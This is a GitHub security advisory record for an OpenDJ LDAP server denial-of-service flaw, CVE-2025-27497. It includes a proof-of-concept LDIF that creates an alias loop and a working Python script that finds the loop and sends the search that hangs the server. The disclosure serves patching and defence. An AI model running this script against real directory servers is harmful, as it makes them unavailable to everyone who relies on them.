{
  "Severity": "HIGH",
  "UpdatedAt": "2025-03-05T18:33:30Z",
  "Package": {
    "Ecosystem": "MAVEN",
    "Name": "org.openidentityplatform.opendj:opendj-server-legacy"
  },
  "Advisory": {
    "DatabaseId": 283194,
    "Id": "GSA_kwCzR0hTQS05M3FyLWg4cHItNDU5M84ABFI6",
    "GhsaId": "GHSA-93qr-h8pr-4593",
    "References": [
      {
        "Url": "https://github.com/OpenIdentityPlatform/OpenDJ/security/advisories/GHSA-93qr-h8pr-4593"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-27497"
      },
      {
        "Url": "https://github.com/OpenIdentityPlatform/OpenDJ/commit/08aee4724608e4a32baa3c7d7499ec913a275aaf"
      },
      {
        "Url": "https://github.com/advisories/GHSA-93qr-h8pr-4593"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-93qr-h8pr-4593"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2025-27497"
      }
    ],
    "Description": "### Summary\nA denial-of-service (DoS) vulnerability in OpenDJ has been discovered that causes the server to become unresponsive to all LDAP requests without crashing or restarting. This issue occurs when an alias loop exists in the LDAP database. If an `ldapsearch` request is executed with alias dereferencing set to \"always\" on this alias entry, the server stops responding to all future requests.\nI have confirmed this issue using the latest OpenDJ version (9.2), both with the official OpenDJ Docker image and a local OpenDJ server running on my Windows 10 machine.\n\n### Details\nAn unauthenticated attacker can exploit this vulnerability using a single crafted `ldapsearch` request. Fortunately, the server can be restarted without data corruption. While this attack requires the existence of an alias loop, I am uncertain whether such loops can be easily created in specific environments or if the method can be adapted to execute other DoS attacks more easily.\n\n### PoC (Steps to Reproduce)\n1. Set up an OpenDJ server instance as usual, using the base DN `dc=example,dc=com`\n2. Import the attached `example_data_alias_dos.ldif` file into the LDAP database\n3. Ensure that the `ldap3` Python library is installed (`pip install ldap3`)\n4. Run the attached Python script `python opendj_alias_dos.py`, which searches for alias loops and executes the DoS attack\n5. After executing the script, the server will stop responding to requests until it is restarted\n\n### Impact\nThis vulnerability directly affects server availability for everyone using it. A single `ldapsearch` request on an alias loop entry can cause the entire server to become unresponsive, requiring a restart. The issue can be repeatedly triggered. The following response message is displayed on following requests:\n```\nresult: 80 Other (e.g., implementation specific) error\ntext: com.sleepycat.je.EnvironmentFailureException: (JE 18.3.12) JAVA_ERROR: Java Error occurred, recovery may not be possible.\n```\n\n**example_data_alias_dos.ldif**\n```\ndn: dc=example,dc=com\nobjectClass: top\nobjectClass: domain\ndc: example\n\ndn: ou=people,dc=example,dc=com\nobjectClass: top\nobjectClass: organizationalUnit\nou: people\ndescription: All users\n\ndn: ou=students,ou=people,dc=example,dc=com\nobjectClass: top\nobjectClass: organizationalUnit\nou: students\ndescription: All students\n\ndn: uid=jd123,ou=students,ou=people,dc=example,dc=com\nobjectClass: top\nobjectClass: inetOrgPerson\nobjectClass: organizationalPerson\nobjectClass: person\nmail: jd123@example.com\nsn: Doe\ncn: John Doe\ngivenName: John\nuid: jd123\n\ndn: ou=employees,ou=people,dc=example,dc=com\nobjectClass: top\nobjectClass: organizationalUnit\nou: employees\ndescription: All employees\n\ndn: uid=jd123,ou=employees,ou=people,dc=example,dc=com\nobjectClass: alias\nobjectClass: top\nobjectClass: extensibleObject\naliasedObjectName: uid=jd123,ou=researchers,ou=people,dc=example,dc=com\nuid: jd123\n\ndn: ou=researchers,ou=people,dc=example,dc=com\nobjectClass: top\nobjectClass: organizationalUnit\nou: researchers\ndescription: All reasearchers\n\ndn: uid=jd123,ou=researchers,ou=people,dc=example,dc=com\nobjectClass: alias\nobjectClass: top\nobjectClass: extensibleObject\naliasedObjectName: uid=jd123,ou=employees,ou=people,dc=example,dc=com\nuid: jd123\n```\n\n**opendj_alias_dos.py**\n```Python\nimport argparse\n\nfrom ldap3 import Server, Connection, ALL, DEREF_NEVER, DEREF_ALWAYS\nfrom ldap3.core.exceptions import LDAPBindError, LDAPSocketOpenError\n\n\ndef connect_to_ldap(ip, port):\n    try:\n        server = Server(ip, port, get_info=ALL)\n        connection = Connection(server, auto_bind=True)\n        return connection\n    except (LDAPBindError, LDAPSocketOpenError) as e:\n        print(f\"Error connecting to LDAP server: {e}\")\n        return None\n\n\ndef find_aliases(connection, base_dn):\n    try:\n        search_filter = \"(objectClass=alias)\"\n        connection.search(base_dn, search_filter=search_filter, dereference_aliases=DEREF_NEVER, attributes=[\"*\"])\n    except Exception as e:\n        print(f\"Error during search: {e}\")\n\n    aliases = {}\n    for entry in connection.entries:\n        entry_dn = entry.entry_dn\n        entry_alias = entry.aliasedObjectName.value\n        aliases[entry_dn] = entry_alias\n\n    return aliases\n\n\ndef detect_alias_loop(aliases):\n    visited = set()\n    path = set()\n\n    def dfs(alias):\n        if alias in path:\n            return alias\n        if alias in visited:\n            return None\n\n        path.add(alias)\n        visited.add(alias)\n\n        aliased_target = aliases.get(alias)\n        if aliased_target:\n            result = dfs(aliased_target)\n            if result:\n                return result\n\n        path.remove(alias)\n        return None\n\n    for alias in aliases:\n        if alias not in visited:\n            loop_alias = dfs(alias)\n            if loop_alias:\n                return loop_alias\n\n    return None\n\n\ndef execute_dos_search(connection, looping_alias_dn):\n    try:\n        search_filter = \"(objectClass=*)\"\n        connection.search(looping_alias_dn, search_filter=search_filter, dereference_aliases=DEREF_ALWAYS)\n    except Exception as e:\n        print(f\"Error during search: {e}\")\n\n    for entry in connection.entries:\n        entry_dn = entry.entry_dn\n        print(entry_dn)\n\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"Search LDAP for circular alias references.\")\n    parser.add_argument(\"ip\", type=str, nargs=\"?\", default=None, help=\"The IP address of the LDAP server.\")\n    parser.add_argument(\"port\", type=int, nargs=\"?\", default=None, help=\"The port of the LDAP server.\")\n    parser.add_argument(\"base\", type=str, nargs=\"?\", default=None, help=\"The base DN of the LDAP server.\")\n    args = parser.parse_args()\n\n    if not args.ip:\n        args.ip = input(\"Please enter the IP address of the LDAP server: \")\n\n    if not args.port:\n        while True:\n            try:\n                port_input = input(\"Please enter the port of the LDAP server: \")\n                args.port = int(port_input)\n                break\n            except ValueError:\n                print(\"Invalid input. Please enter a valid integer for the port.\")\n\n    if not args.base:\n        args.base = input(\"Please enter the base DN of the LDAP server: \")\n\n    connection = connect_to_ldap(args.ip, args.port)\n    if connection:\n        aliases = find_aliases(connection, args.base)\n        looping_alias_dn = detect_alias_loop(aliases)\n        if looping_alias_dn:\n            execute_dos_search(connection, looping_alias_dn)\n            print(f\"DOS executed with alias: {looping_alias_dn}\")\n        else:\n            print(\"No looping alias DN found!\")\n        connection.unbind()\n\n\nif __name__ == \"__main__\":\n    main()\n```",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-03-05T18:33:30Z",
    "Severity": "HIGH",
    "Summary": "OpenDJ Denial of Service (DoS) using alias loop",
    "UpdatedAt": "2025-03-05T18:33:30Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 0,
      "VectorString": ""
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "4.9.3"
      },
      "VulnerableVersionRange": "\u003c 4.9.3"
    }
  ]
}